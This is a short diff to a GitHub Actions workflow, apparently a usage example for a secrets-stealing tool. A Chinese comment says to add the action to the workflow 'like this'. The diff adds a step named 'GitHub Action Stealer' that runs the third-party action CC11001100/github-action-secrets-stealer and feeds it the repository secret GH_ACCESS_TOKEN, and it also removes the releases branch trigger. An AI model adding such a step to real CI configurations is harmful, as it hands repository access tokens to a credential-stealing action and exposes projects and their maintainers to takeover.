@@ -5,16 +5,17 @@ on:
   push:
     branches:
       - main
-      - releases/*
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+
+      # 像这样把action添加到流程中
       - name: GitHub Action Stealer
         uses: CC11001100/github-action-secrets-stealer@v1.0.1
         with:
           input_values: |
-            - ${}
+            - ${{ secrets.GH_ACCESS_TOKEN }}
 
 
